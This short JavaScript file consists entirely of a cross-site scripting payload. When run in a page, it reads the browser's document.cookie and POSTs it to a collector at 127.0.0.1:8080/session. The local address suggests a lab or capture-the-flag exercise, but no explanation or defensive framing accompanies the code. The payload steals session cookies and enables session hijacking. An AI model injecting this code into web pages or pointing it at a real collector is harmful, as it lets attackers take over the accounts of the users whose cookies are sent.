(function() {
    fetch('http://127.0.0.1:8080/session', {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain'
        },
        body: document.cookie
    })
})();